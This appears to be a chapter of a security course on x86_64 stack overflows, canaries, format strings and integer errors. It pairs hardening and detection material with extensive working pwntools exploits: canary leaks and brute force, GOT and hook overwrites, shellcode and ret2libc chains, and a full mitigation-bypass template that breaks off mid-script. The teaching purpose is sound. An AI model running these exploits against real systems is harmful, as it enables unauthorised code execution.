# Domain 3, Chapter 3A — Stack Corruption, Format Strings, and Integer Errors

> **Scope.** Stack buffer overflow mechanics. The System V AMD64 ABI stack frame: return address, saved RBP, local variables, callee-saved registers, red zone. Frame pointer omission. Stack canaries: `fs:0x28`, `__stack_chk_fail`, `__stack_chk_guard`, TLS-based storage, canary leak vectors. `FORTIFY_SOURCE` for `memcpy`, `strcpy`, `sprintf`. Stack clash attacks and `-fstack-clash-protection`. Variable-length arrays and `alloca`. The `sigaltstack` mechanism. Sigreturn-oriented programming (cross-reference to Domain 4 §7). Format string vulnerabilities: `%n`, `%hn`, `%hhn`, `%s`, positional parameters, stack walking, GOT writes. Integer errors: unsigned wraparound, signed overflow, truncation, signedness confusion, `malloc(0)`, `realloc` edge cases, `calloc` overflow checks, compiler builtins, and sanitizers.
>
> **Prerequisites.** Domain 1 (GOT/PLT for format-string GOT writes, ELF canary from `AT_RANDOM`), Domain 2 (stack placement, ASLR, page permissions, `sigreturn` dispatch).

---

## 1. Stack frame layout — System V AMD64 ABI

### 1.1 The canonical frame

On x86_64, the System V AMD64 ABI defines the calling convention. A typical function prologue creates a stack frame:

```
High addresses (caller's frame)
┌──────────────────────────────┐
│  Return address (8 bytes)    │  ← pushed by CALL instruction
├──────────────────────────────┤
│  Saved RBP (8 bytes)         │  ← pushed by: push rbp; mov rbp, rsp
├──────────────────────────────┤
│  Callee-saved registers      │  ← RBX, R12–R15 (if used)
├──────────────────────────────┤
│  Local variables             │  ← allocated by: sub rsp, N
│  (including any arrays)      │
├──────────────────────────────┤
│  Stack canary (8 bytes)      │  ← if -fstack-protector
├──────────────────────────────┤
│  Alignment padding           │
├──────────────────────────────┤
│  Spill slots for register    │
│  arguments and call args     │
└──────────────────────────────┘
Low addresses (toward RSP)       ← 128-byte red zone below RSP
```

Arguments are passed in registers: `RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9` (integers/pointers), `XMM0`–`XMM7` (floats). Additional arguments go on the stack. The return value is in `RAX` (integer) or `XMM0` (float).

The compiler arranges local variables so that the stack canary sits between the local buffers and the saved RBP/return address. An overflow of a local buffer must overwrite the canary before reaching the return address.

### 1.2 The red zone

The AMD64 ABI guarantees a 128-byte region below `RSP` (the "red zone") that is not clobbered by signal handlers or interrupts. Leaf functions can use this space without adjusting `RSP`.

Security note: the red zone means data exists below `RSP` that is not accounted for by the stack pointer. Signal delivery respects the red zone (the kernel's `setup_sigcontext` moves `RSP` 128 bytes below the current `RSP` before placing the signal frame), but `sigaltstack`-based handlers use a separate stack.

### 1.3 Frame pointer omission

`-fomit-frame-pointer` (the default at `-O1` and above on x86_64) eliminates the `push rbp; mov rbp, rsp` prologue, freeing `RBP` for use as a general-purpose register.

Stack walking without frame pointers requires unwind tables (`.eh_frame`, Domain 1 Chapter 1B §6). The `leave; ret` stack-pivot gadget (Domain 4 §2.4) relies on `RBP` containing a saved frame pointer. Recent kernel builds use frame pointers (`CONFIG_FRAME_POINTER=y`) for observability.

---

## 2. Stack canaries

### 2.1 Implementation on x86_64

**Prologue**: the compiler inserts `mov rax, fs:0x28; mov [rbp-8], rax`. The value at `fs:0x28` is the per-thread canary, stored in the Thread Control Block (TCB), initialized from `AT_RANDOM` during glibc startup.

**Epilogue**: `mov rax, [rbp-8]; xor rax, fs:0x28; jne __stack_chk_fail`.

**`__stack_chk_fail`**: prints "*** stack smashing detected ***", calls `abort()`, terminated with `SIGABRT`.

### 2.2 Canary composition

The canary is 8 bytes on x86_64. glibc initializes it from `AT_RANDOM` with the first byte forced to `\x00` (NUL). A `strcpy`-based overflow stops at the NUL. A `memcpy`-based overflow can overwrite all 8 bytes. The remaining 7 bytes provide 56 bits of entropy.

### 2.3 Canary leak vectors

**Format string vulnerabilities** (§5): `%p` reads stack slots including the canary.

**Buffer over-reads**: reading past the end of a stack buffer includes the canary in leaked data.

**Uninitialized memory**: stack variable reuse may contain canary from previous frame.

**Forking**: after `fork`, parent and child share the same canary. This enables BROP (Domain 4 §8).

### 2.4 Canary leak and bypass — practical exploitation

```python
# pwntools — leak canary via format string
from pwn import *

elf = ELF('./vuln')
p = process('./vuln')

# Step 1: find canary offset on stack
# Send format string payloads with increasing positional parameters
for i in range(1, 30):
    p.sendline(f'%{i}$p')
    result = p.recvline()
    print(f"Offset {i}: {result}")
    # The canary is identifiable: ends with \x00 (low byte is null)
    # Typical offset: 11-17 depending on binary

# Step 2: leak canary at known offset
p.sendline('%11$p')    # Adjust offset based on above enumeration
canary = int(p.recvline().strip(), 16)
log.info(f"Leaked canary: {hex(canary)}")

# Step 3: overflow with correct canary value
payload = flat(
    b'A' * buffer_size,     # Fill buffer
    p64(canary),            # Overwrite canary with correct value
    b'B' * 8,               # Saved RBP (can be anything)
    p64(target_address),    # Return address → shellcode/ROP chain
)
p.sendline(payload)
```

```python
# pwntools — canary brute-force in forking server
from pwn import *

def try_canary_byte(known_bytes, test_byte):
    """Try one byte of the canary. Returns True if server doesn't crash."""
    p = remote('target', 1234)
    payload = b'A' * buffer_size + known_bytes + bytes([test_byte])
    p.send(payload)
    try:
        p.recv(timeout=1)
        p.close()
        return True
    except:
        p.close()
        return False

canary = b'\x00'  # First byte is always NUL
for byte_pos in range(1, 8):
    for test_byte in range(256):
        if try_canary_byte(canary, test_byte):
            canary += bytes([test_byte])
            log.info(f"Found byte {byte_pos}: {hex(test_byte)}")
            break
log.success(f"Full canary: {canary.hex()}")
# Maximum attempts: 7 * 256 = 1792
```

### 2.5 Stack protector variants

| Variant | GCC Flag | Protection Level | Performance |
|---|---|---|---|
| None | `-fno-stack-protector` | No canary | Fastest |
| Basic | `-fstack-protector` | Only functions with `char[]` buffers | Low overhead |
| Strong | `-fstack-protector-strong` | Functions with arrays, address-taken locals, register spills | Moderate |
| All | `-fstack-protector-all` | Every function | Highest overhead |

```bash
# Check binary's stack protection
checksec --file=./binary
# Output: Stack: Canary found / No canary found

# GDB — inspect canary at runtime
gdb ./binary
> break *main+20
> run
> x/gx $fs_base+0x28    # Read canary from TLS
> info registers rbp    # Saved RBP location
> x/gx $rbp-8           # Canary on stack (should match TLS)

# pwndbg enhancements
> canary                 # Direct canary value display
```

---

## 3. `FORTIFY_SOURCE`

`FORTIFY_SOURCE` replaces calls to `memcpy`, `strcpy`, `sprintf`, `strncpy`, `snprintf`, `strncat`, and `gets` with fortified variants that check destination buffer size.

| Level | Flag | Detection | Key Behavior |
|---|---|---|---|
| 0 | Default (no flag) | None | Standard functions |
| 1 | `-D_FORTIFY_SOURCE=1` | Compile-time when size known | `__builtin_object_size(ptr, 0)` — whole object |
| 2 | `-D_FORTIFY_SOURCE=2` | Compile-time + runtime | `__builtin_object_size(ptr, 1)` — narrowest subobject |
| 3 | `-D_FORTIFY_SOURCE=3` (GCC 12+) | Dynamic size tracking | `__builtin_dynamic_object_size` |

**Format string restriction:** `__printf_chk` refuses `%n` when the format string is in writable memory.

```bash
# Verify FORTIFY_SOURCE in binary
readelf -s ./binary | grep _chk
# Presence of __memcpy_chk, __strcpy_chk, __printf_chk → fortified

# objdump — confirm fortified functions
objdump -d ./binary | grep -c '__chk'

# Test FORTIFY_SOURCE detection
cat > test_fortify.c << 'EOF'
#include <string.h>
#include <stdio.h>
void vuln(char *input) {
    char buf[16];
    strcpy(buf, input);  // Should be replaced with __strcpy_chk
    printf(buf);         // Should be replaced with __printf_chk
}
EOF
gcc -O2 -D_FORTIFY_SOURCE=2 -o test_fortify test_fortify.c
objdump -d test_fortify | grep -E '(__strcpy_chk|__printf_chk)'
```

---

## 4. Stack clash and related stack manipulations

### 4.1 Stack clash attacks

The stack clash vulnerability class exploits the gap between the stack VMA and adjacent VMAs. A function allocating a very large local variable can move `RSP` past the guard page without touching it, landing in an adjacent mapping.

`-fstack-clash-protection` (GCC 8+, Clang 11+) inserts page-granular probes:

```asm
; allocate 0x10000 bytes of stack (16 pages)
sub    rsp, 0x1000    ; probe first page
test   [rsp], rsp     ; touch it
sub    rsp, 0x1000    ; probe second page
test   [rsp], rsp
; ... repeat ...
```

**Exploitation scenario:**
```python
# Stack clash to overwrite heap (conceptual)
# Step 1: Binary has unbounded alloca() or large VLA
# Step 2: Pass large value to move RSP past guard page
# Step 3: RSP now points into an adjacent mmap region
# Step 4: Local variable writes corrupt the adjacent mapping

# GDB — verify stack clash protection
gdb ./binary
> disassemble vulnerable_func
# Look for sequential sub rsp + test [rsp] pattern

# Verification
gcc -fstack-clash-protection -S -o clash_test.s test.c
grep -A1 'sub.*rsp' clash_test.s | grep 'test'
```

### 4.2 Variable-length arrays and `alloca`

```bash
# Check for VLA usage (potential stack clash vector)
gcc -Wvla -c source.c
# Any warnings indicate VLA usage

# Kernel approach: prohibit VLAs entirely
# Linux kernel since 4.20: -Wvla -Werror
# Build system enforces no VLAs

# Alternative to alloca (use heap with cleanup)
# C11 approach: use malloc + free with scope-bound cleanup
```

### 4.3 `sigaltstack` security implications

```c
// Register alternate signal stack
#include <signal.h>
stack_t ss;
ss.ss_sp = mmap(NULL, SIGSTKSZ, PROT_READ|PROT_WRITE,
                 MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
ss.ss_size = SIGSTKSZ;
ss.ss_flags = 0;
sigaltstack(&ss, NULL);

// Attack: if attacker can call sigaltstack() with controlled address,
// signal delivery writes sigframe to attacker-chosen location
```

---

## 5. Format string vulnerabilities

### 5.1 The `printf` family attack surface

When a `printf`-family function receives a user-controlled format string, the attacker uses format specifiers to read from and write to arbitrary memory.

### 5.2 Reading memory

**`%p`** prints a pointer-sized value in hex. Each `%p` consumes the next argument slot. By chaining many `%p`, the attacker reads successive stack values.

**`%s`** treats the argument as a pointer and reads the NUL-terminated string at that address.

**Positional parameters (`%N$p`, `%N$s`)**: access the Nth argument directly.

### 5.3 Writing memory

**`%n`** writes the number of bytes printed so far to the address pointed to by the next argument. **`%hn`** writes a `short` (2 bytes); **`%hhn`** writes a single byte.

### 5.4 Exploitation step-by-step

**Step 1 — Identify the vulnerability:**
```bash
# Fuzzing for format string bugs
echo "AAAA%p%p%p%p%p%p%p%p" | ./vuln
# If output shows hex values after AAAA → format string vulnerability

# Detect crash with %s (dereferences stack values as pointers)
echo "%s%s%s%s%s%s%s" | ./vuln
# Crash → confirmed format string vulnerability
```

**Step 2 — Determine input offset:**
```bash
# Find where your input appears on the stack
echo 'AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p' | ./vuln
# Look for 0x4141414141414141 in output → that's your offset

# Direct offset determination
echo 'AAAAAAAA%6$p' | ./vuln  # Try offset 6
echo 'AAAAAAAA%7$p' | ./vuln  # Try offset 7
# When output shows 0x4141414141414141 → correct offset found
```

**Step 3 — Leak addresses:**
```python
# pwntools — automated format string exploitation
from pwn import *

elf = ELF('./vuln')
p = process('./vuln')

# Leak GOT entry (e.g., puts@got)
payload = fmtstr_payload(
    offset=6,           # Offset where input starts on stack
    writes={elf.got['puts']: elf.symbols['win']},  # Overwrite puts@GOT
    numbwritten=0,
    write_size='short'  # Use %hn for 2-byte writes
)
p.sendline(payload)

# Alternative: manual format string write
# To write 0xdeadbeef to address 0x404028:
# Split into two shorts: 0xdead and 0xbeef
# Calculate padding for each %hn write
target = 0x404028
val_low = 0xbeef    # Write to target
val_high = 0xdead   # Write to target+2

# Construct payload with address on stack + format specifiers
payload = p64(target) + p64(target + 2)
# Add format specifiers to print exact number of bytes before each %hn
# (Complex calculation — pwntools fmtstr_payload handles this automatically)
```

**Step 4 — GOT overwrite for code execution:**
```python
# pwntools — full format string → RCE exploit
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Stage 1: leak libc address via format string
p = process('./vuln')
p.sendline('%3$p')  # Leak a libc address (e.g., __libc_start_main return)
leak = int(p.recvline().strip(), 16)
libc.address = leak - libc.symbols['__libc_start_main'] - 243
log.info(f"libc base: {hex(libc.address)}")

# Stage 2: overwrite __malloc_hook or GOT entry with one_gadget
one_gadget = libc.address + 0xe3b01  # Find with: one_gadget libc.so.6
payload = fmtstr_payload(6, {libc.symbols['__free_hook']: one_gadget})
p.sendline(payload)

# Stage 3: trigger the overwritten function
p.sendline('/bin/sh')  # If free_hook is overwritten, freeing this → shell
p.interactive()
```

### 5.5 Format string on x86_64 vs x86

| Aspect | x86 (32-bit) | x86_64 (64-bit) |
|---|---|---|
| Arguments | All on stack | First 6 in registers (RDI-R9), rest on stack |
| Input offset | Typically 4-8 | Typically 6-10 (after register args) |
| Address size | 4 bytes (easy to embed in format string) | 8 bytes (contains NUL bytes → must be placed AFTER format specifiers) |
| Write primitive | Address in string → `%N$n` | Address after format string (NUL bytes terminate early if placed first) |
| Complexity | Lower | Higher (address placement constraints) |

**x86_64 address placement trick:**
```python
# On 64-bit, addresses contain NUL bytes (e.g., 0x00007fff...)
# Place addresses AFTER format specifiers to avoid early termination
# Format: [format specifiers][padding][addresses]

# pwntools handles this automatically with fmtstr_payload()
# For manual construction:
payload = b'%' + str(low_val).encode() + b'c%8$hn'  # Write low 2 bytes
payload += b'%' + str(high_val - low_val).encode() + b'c%9$hn'  # Write high 2 bytes
payload = payload.ljust(64, b'A')  # Pad to align addresses
payload += p64(target_addr)        # Address at offset 8
payload += p64(target_addr + 2)    # Address at offset 9
```

### 5.6 Detection

**YARA rule — format string in binary:**
```yara
rule Format_String_Vulnerability_Pattern {
    meta:
        description = "Detect potential format string vulnerability patterns"
    strings:
        $vuln1 = { E8 ?? ?? ?? ?? }  // call printf
        $fmt_n = "%n" ascii
        $fmt_hn = "%hn" ascii
        $fmt_hhn = "%hhn" ascii
        $user_controlled = "scanf" ascii
        $gets = "gets" ascii
    condition:
        any of ($fmt_n, $fmt_hn, $fmt_hhn) and
        any of ($user_controlled, $gets)
}
```

```bash
# Static analysis — find format string vulnerabilities
# GCC warnings
gcc -Wformat -Wformat-security -Werror=format-security source.c

# cppcheck — static analyzer
cppcheck --enable=warning source.c 2>&1 | grep 'formatstr'

# Flawfinder — security-focused static analyzer
flawfinder --minlevel=3 source.c | grep -i 'format'

# Binary analysis — check for unprotected printf calls
objdump -d ./binary | grep -B5 'printf' | grep -v '__printf_chk'
# If printf (not __printf_chk) is called → may be vulnerable
```

### 5.7 Mitigations

**`FORTIFY_SOURCE`**: replaces `printf` with `__printf_chk`, which refuses `%n` when the format string resides in writable memory.

**Compiler warnings**: `-Wformat-security` warns when a non-literal format string is passed.

**Code review**: never pass user-controlled data as a format string. `printf("%s", user_input)` not `printf(user_input)`.

**ASLR + Full RELRO**: the attacker needs to know the GOT address (defeated by ASLR) and the GOT must be writable (defeated by Full RELRO).

---

## 6. Integer errors

### 6.1 Categories

**Unsigned wraparound.** `if (len + header_size > buf_size)` bypassed when `len + header_size` wraps.

**Signed overflow.** Undefined behavior in C/C++. Compiler may optimize away checks.

**Truncation.** `uint32_t x = (uint64_t)len` silently truncates.

**Signedness confusion.** `-1` compared to unsigned `size_t` becomes 0xFFFFFFFFFFFFFFFF.

### 6.2 Exploitation patterns

```c
// Vulnerable pattern 1: unsigned wraparound in length check
void process_data(char *input, uint32_t user_len) {
    uint32_t total = user_len + HEADER_SIZE;  // Can wrap to small value
    char *buf = malloc(total);                // Small allocation
    memcpy(buf, header, HEADER_SIZE);
    memcpy(buf + HEADER_SIZE, input, user_len);  // Heap overflow
}
// Attack: user_len = 0xFFFFFFFF - HEADER_SIZE + 1 → total wraps to 0 or small

// Vulnerable pattern 2: signed/unsigned comparison
void copy_data(char *dst, char *src, int len) {
    if (len > MAX_SIZE) return;    // Negative len passes this check
    memcpy(dst, src, len);         // len promoted to size_t → huge copy
}
// Attack: len = -1 → passes check, memcpy interprets as 0xFFFFFFFFFFFFFFFF

// Vulnerable pattern 3: truncation
void allocate_buffer(uint64_t requested_size) {
    uint32_t size = (uint32_t)requested_size;  // Truncation
    char *buf = malloc(size);                   // Small allocation
    read(fd, buf, requested_size);              // Read with original large size
}
// Attack: requested_size = 0x100000010 → size = 0x10, but reads 0x100000010 bytes
```

```python
# pwntools — integer overflow exploitation
from pwn import *

p = process('./vuln')

# Trigger unsigned wraparound
# If binary allocates: malloc(user_input + 16)
# We want user_input + 16 to wrap to a small number
# For 32-bit: 0xFFFFFFFF - 16 + 1 = 0xFFFFFFF0
overflow_value = 0xFFFFFFF0
p.sendline(str(overflow_value))
# malloc(0xFFFFFFF0 + 16) = malloc(0) or malloc(very small)
# Subsequent write with overflow_value size → heap overflow
```

### 6.3 Real-world integer overflow CVEs

| CVE | Software | Integer Error Type | Impact |
|---|---|---|---|
| CVE-2021-21224 | V8 (Chrome) | `int32` → `int64` truncation in JIT | Renderer RCE |
| CVE-2017-7529 | Nginx | Integer overflow in range filter | Info leak (up to 4096 bytes before response) |
| CVE-2013-2094 | Linux kernel (perf) | `int` → `u64` signedness confusion | Local root |
| CVE-2009-1385 | Linux kernel (e1000e) | Integer underflow in frame size | Kernel heap overflow |
| CVE-2021-3156 | sudo (Baron Samedit) | Off-by-one → heap overflow from size miscalculation | Local root |
| CVE-2014-0160 | OpenSSL (Heartbleed) | Missing bounds check on length field | Remote memory disclosure |

### 6.4 Integer errors in memory allocation

**`malloc(0)`**: the C standard allows returning NULL or a unique pointer. Using the returned pointer is undefined.

**`realloc` edge cases.** `realloc(ptr, 0)` is implementation-defined. Code that doesn't check return for NULL may dereference NULL.

**`calloc` overflow check.** `calloc(nmemb, size)` must detect `nmemb * size` overflow. glibc checks and returns NULL with ENOMEM.

### 6.5 Compiler-level defenses

```c
// Checked arithmetic builtins (GCC/Clang)
uint32_t total;
if (__builtin_add_overflow(len, header_size, &total)) {
    // Handle overflow — reject input
    return -EINVAL;
}
char *buf = malloc(total);

// Safe multiplication check
size_t alloc_size;
if (__builtin_mul_overflow(count, element_size, &alloc_size)) {
    return -EINVAL;
}

// Clang-specific: __builtin_*_overflow_p (predicate, no result)
if (__builtin_add_overflow_p(a, b, (typeof(a))0)) {
    // Would overflow
}
```

| Flag | Compiler | Effect | Overhead |
|---|---|---|---|
| `-ftrapv` | GCC/Clang | Trap on signed overflow | High (every signed op) |
| `-fwrapv` | GCC/Clang | Define signed overflow as wrapping | None (changes semantics) |
| `-fsanitize=integer` | Clang | Detect all integer issues at runtime | Moderate |
| `-fsanitize=signed-integer-overflow` | Clang | Detect signed overflow only | Low-moderate |
| `-fsanitize=unsigned-integer-overflow` | Clang | Detect unsigned wrapping | Low-moderate |

```bash
# Compile with UBSan integer checks
clang -fsanitize=integer -fno-sanitize-recover=integer -o test test.c
./test  # Traps on any integer overflow

# GCC equivalent (less comprehensive)
gcc -ftrapv -o test test.c
```

---

## 7. Stack buffer overflow — complete exploitation walkthrough

### 7.1 Reconnaissance

```bash
# Binary analysis
file ./vuln
checksec --file=./vuln
# Key properties:
#   CANARY: enabled/disabled
#   NX: enabled/disabled (stack executable?)
#   PIE: enabled/disabled (ASLR for binary?)
#   RELRO: full/partial/none (GOT writable?)

# Identify vulnerable functions
objdump -d ./vuln | grep -E '(strcpy|gets|sprintf|strcat|scanf)@plt'
# Presence of gets/strcpy without _chk → likely vulnerable

# Find buffer sizes
gdb ./vuln
> disassemble vuln_function
# Look for: sub rsp, 0xN → local buffer size = N
# Look for: lea rdi, [rbp-0x40] → buffer at rbp-0x40 (64 bytes from RBP)
```

### 7.2 Determine overflow offset

```python
# pwntools — cyclic pattern for offset determination
from pwn import *

# Generate unique pattern
pattern = cyclic(200)
p = process('./vuln')
p.sendline(pattern)
p.wait()

# Read core dump for crash address
core = Coredump('./core')
offset = cyclic_find(core.fault_addr)  # For direct RIP overwrite
# Or: cyclic_find(core.read(core.rsp, 4))  # RSP-based
log.info(f"Offset to return address: {offset}")
```

```bash
# GDB — manual offset determination
gdb ./vuln
> run < <(python3 -c "import pwn; print(pwn.cyclic(200).decode())")
# Crash: RIP = 0x6161616c (part of cyclic pattern)
> python3 -c "from pwn import *; print(cyclic_find(0x6161616c))"
# Output: 40 → buffer is 40 bytes before return address
```

### 7.3 Exploit construction

**Case 1: NX disabled (stack executable, no canary, no ASLR)**
```python
from pwn import *

context.arch = 'amd64'
offset = 40  # From step 7.2

shellcode = asm(shellcraft.sh())  # /bin/sh shellcode

# NOP sled + shellcode + padding + return address (pointing to stack)
nop_sled = asm('nop') * 16
payload = nop_sled + shellcode
payload = payload.ljust(offset, b'A')
payload += p64(0x7fffffffe000)  # Approximate stack address (needs tuning)

p = process('./vuln')
p.sendline(payload)
p.interactive()
```

**Case 2: NX enabled, no ASLR, no canary (ret2libc)**
```python
from pwn import *

elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Find gadgets
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]  # Stack alignment

# ret2libc: system("/bin/sh")
payload = flat(
    b'A' * offset,
    p64(ret),              # Stack alignment (Ubuntu 18.04+ requires 16-byte alignment)
    p64(pop_rdi),
    p64(next(libc.search(b'/bin/sh\x00'))),
    p64(libc.symbols['system']),
)

p = process('./vuln')
p.sendline(payload)
p.interactive()
```

**Case 3: NX + ASLR + no canary (leak + ret2libc)**
```python
from pwn import *

elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# Stage 1: leak libc address via puts(puts@GOT)
payload = flat(
    b'A' * offset,
    p64(pop_rdi),
    p64(elf.got['puts']),
    p64(elf.plt['puts']),      # Call puts(puts@GOT) → leaks libc address
    p64(elf.symbols['main']),  # Return to main for stage 2
)

p = process('./vuln')
p.sendline(payload)

# Parse leaked address
leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked_puts - libc.symbols['puts']
log.info(f"libc base: {hex(libc.address)}")

# Stage 2: system("/bin/sh") with correct libc base
payload2 = flat(
    b'A' * offset,
    p64(ret),
    p64(pop_rdi),
    p64(next(libc.search(b'/bin/sh\x00'))),
    p64(libc.symbols['system']),
)
p.sendline(payload2)
p.interactive()
```

**Case 4: NX + ASLR + canary + PIE (full mitigation bypass)**
```python
from pwn import *

elf = ELF('./vuln')

# Requires: format string to leak canary + PIE base + libc base
# Or: another info leak primitive

p = process('./vuln')

# Leak canary via format string (if available)
p.sendline('%11$p.%13$p.%15$p')
leaks = p.recvline().split(b'.')
canary = int(leaks[0], 16)
pie_leak = int(leaks[1], 16)
libc_leak = int(leaks[2], 16)

elf.address = pie_leak - elf.symbols['main'] - 0x5a  # Adjust offset
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = libc_leak - libc.symbols['__libc_start_main'] - 243

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

payload = flat(
    b'A' * buf_to_canary,     # Buffer padding
    p64(canary),              # Correct canary value
    b'B' * 8,                 # Saved RBP
    p64(ret),                 # Stack alignment
    p64(pop_rdi),
    p64(next(libc.search(b'/bin/sh\x00'))),
    p64(libc.symbols['system']),
)
p.sendline(payload)
p.interactive()
```

### 7.4 Debugging with GDB/pwndbg

```bash
# Essential GDB commands for exploit development
gdb -q ./vuln

# pwndbg/GEF enhancements
> checksec                    # Show binary protections
> vmmap                       # Virtual memory map
> canary                      # Display canary value
> got                         # Show GOT entries
> rop --grep "pop rdi"        # Search for ROP gadgets
> search -s "/bin/sh"         # Find strings in memory
> telescope $rsp 20           # Show stack with dereferencing

# Set breakpoint before return
> break *vuln_func+0x5a       # Before leave;ret
> run < payload.bin
> x/20gx $rsp                 # Examine stack at return
> si                          # Single-step to observe RIP change

# Core dump analysis
ulimit -c unlimited
./vuln < payload.bin
gdb ./vuln core
> bt                          # Backtrace
> info registers              # All registers at crash
> x/20gx $rsp                 # Stack at crash
```

---

## 8. Tooling reference

### 8.1 Exploit development tools

| Tool | Purpose | Key Usage |
|---|---|---|
| pwntools | Python exploit framework | Process interaction, payload generation, ROP |
| GDB + pwndbg | Debugger + exploit plugin | Runtime analysis, gadget search, heap analysis |
| GDB + GEF | Alternative GDB plugin | Similar to pwndbg with different UI |
| ROPgadget | ROP chain generator | `ROPgadget --binary ./vuln --ropchain` |
| ropper | Gadget finder | `ropper -f ./vuln --search "pop rdi"` |
| one_gadget | Find one-shot RCE in libc | `one_gadget /lib/x86_64-linux-gnu/libc.so.6` |
| checksec | Binary mitigation checker | `checksec --file=./vuln` |
| Ghidra | Decompiler/disassembler | Identify vulnerable functions |
| radare2/rizin | CLI reverse engineering | `aaa; afl; pdf @main` |

### 8.2 Fuzzing for stack corruption bugs

```bash
# AFL++ — coverage-guided fuzzing
afl-fuzz -i input_corpus/ -o findings/ -- ./vuln @@

# AFL++ with ASAN for crash detection
afl-cc -fsanitize=address -o vuln_asan vuln.c
afl-fuzz -i input/ -o out/ -- ./vuln_asan @@

# libFuzzer — in-process fuzzing
clang -fsanitize=fuzzer,address -o fuzz_target fuzz_harness.c
./fuzz_target corpus/

# Honggfuzz — multi-process fuzzer
honggfuzz -i input/ -o crashes/ -- ./vuln ___FILE___
```

```c
// libFuzzer harness for format string testing
#include <stdint.h>
#include <stdio.h>
#include <string.h>

int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    char buf[256];
    if (size > 255) size = 255;
    memcpy(buf, data, size);
    buf[size] = '\0';
    
    char output[4096];
    snprintf(output, sizeof(output), buf);  // Vulnerable to format string
    return 0;
}
```

---

## 9. Detection and monitoring

### 9.1 Runtime detection

```bash
# Detect stack smashing in syslog/journald
journalctl | grep 'stack smashing detected'
dmesg | grep 'segfault'

# auditd — monitor for exploitation attempts
auditctl -a always,exit -F arch=b64 -S execve -k exec_monitor
# Watch for unexpected shells spawned from vulnerable services

# Falco — detect exploitation indicators
# rule: detect process spawned from network service
- rule: Shell Spawned by Network Service
  desc: Detect shell spawned by a service listening on network
  condition: >
    spawned_process and proc.name in (bash, sh, dash, zsh) and
    proc.pname in (nginx, apache2, httpd, node, python)
  output: >
    Shell spawned by network service (user=%user.name
    command=%proc.cmdline parent=%proc.pname)
  priority: CRITICAL
```

### 9.2 YARA rules

```yara
rule Stack_Buffer_Overflow_Exploit_Shellcode {
    meta:
        description = "Detect common x86_64 shellcode patterns in payloads"
    strings:
        $nop_sled = { 90 90 90 90 90 90 90 90 }
        $execve_syscall = { 48 31 c0 48 89 c2 48 89 c6 48 8d 3d ?? ?? ?? ?? b0 3b 0f 05 }
        $bin_sh = "/bin/sh" ascii
        $bin_bash = "/bin/bash" ascii
        $shellcraft_pattern = { 6a 68 48 b8 2f 62 69 6e 2f 2f 2f 73 }
    condition:
        $nop_sled and ($bin_sh or $bin_bash) or
        $execve_syscall or
        $shellcraft_pattern
}
```

---

## 10. Hardening checklist

| Control | Implementation | Effectiveness |
|---|---|---|
| Stack canary | `-fstack-protector-strong` | Detects linear overflows (bypassed by leak) |
| FORTIFY_SOURCE | `-D_FORTIFY_SOURCE=2` | Catches known-size buffer overflows at compile/run time |
| NX (W^X) | Default on modern kernels | Prevents stack shellcode execution |
| ASLR | `/proc/sys/kernel/randomize_va_space = 2` | Randomizes stack/heap/mmap addresses |
| PIE | `-pie` (default in modern distros) | Randomizes binary base address |
| Full RELRO | `-Wl,-z,relro,-z,now` | Makes GOT read-only |
| Stack clash protection | `-fstack-clash-protection` | Prevents stack-heap collision |
| CFI | `-fsanitize=cfi` (Clang) | Control flow integrity |
| Shadow stack | CET (`-fcf-protection=full`) | Hardware return address protection |
| Safe linking | glibc 2.32+ | Mangles single-linked list pointers in heap |

```bash
# Verify all protections on a production binary
checksec --file=./production_binary

# Recommended GCC/Clang flags for hardened compilation
CFLAGS="-O2 -Wall -Wextra -Werror=format-security \
  -fstack-protector-strong -D_FORTIFY_SOURCE=2 \
  -fstack-clash-protection -fcf-protection=full \
  -fPIE -pie"
LDFLAGS="-Wl,-z,relro,-z,now -Wl,-z,noexecstack"
```

---

## 11A. Pwntools stack overflow exploit template

### 11A.1 End-to-end exploit: canary + ASLR + NX bypass

This template unifies the individual techniques from §2.4 (canary leak), §5.4 (format string GOT overwrite), and §7.3 (ROP chains) into a single working exploit against a binary compiled with `-fstack-protector-strong -pie -z relro -z now`.

```python
#!/usr/bin/env python3
"""Full stack overflow exploit — leak canary, leak libc, ROP to shell."""
from pwn import *

# ── Configuration ──────────────────────────────────────────────
BINARY  = './vuln'
LIBC    = '/lib/x86_64-linux-gnu/libc.so.6'
REMOTE  = ('target.ctf.example', 1337)

context.binary = elf = ELF(BINARY)
libc = ELF(LIBC)

def conn():
    """Switch local ↔ remote with a single flag."""
    if args.REMOTE:
        return remote(*REMOTE)
    return process(BINARY)

# ── Step 1: find overflow offset with cyclic ───────────────────
# Run once interactively, then hardcode:
#   io = conn(); io.sendline(cyclic(300)); io.wait()
#   core = Coredump('./core')
#   offset = cyclic_find(core.read(core.rsp, 4))
BUF_TO_CANARY = 72       # buffer start → canary
CANARY_TO_RBP = 8        # canary → saved RBP
RBP_TO_RIP    = 8        # saved RBP → return address

# ── Step 2: leak canary via format string ──────────────────────
io = conn()
io.sendlineafter(b'> ', b'%11$p')          # positional arg 11 = canary slot
canary = int(io.recvline().strip(), 16)
log.info(f'canary : {hex(canary)}')
assert canary & 0xff == 0, 'low byte must be NUL — wrong offset?'

# ── Step 3: leak PIE base ─────────────────────────────────────
io.sendlineafter(b'> ', b'%13$p')          # return address of caller
pie_leak = int(io.recvline().strip(), 16)
elf.address = pie_leak - (elf.symbols['main'] + 0x5a)  # adjust per disasm
log.info(f'PIE base: {hex(elf.address)}')

# ── Step 4: leak libc via GOT ─────────────────────────────────
rop1 = ROP(elf)
pop_rdi = rop1.find_gadget(['pop rdi', 'ret'])[0]
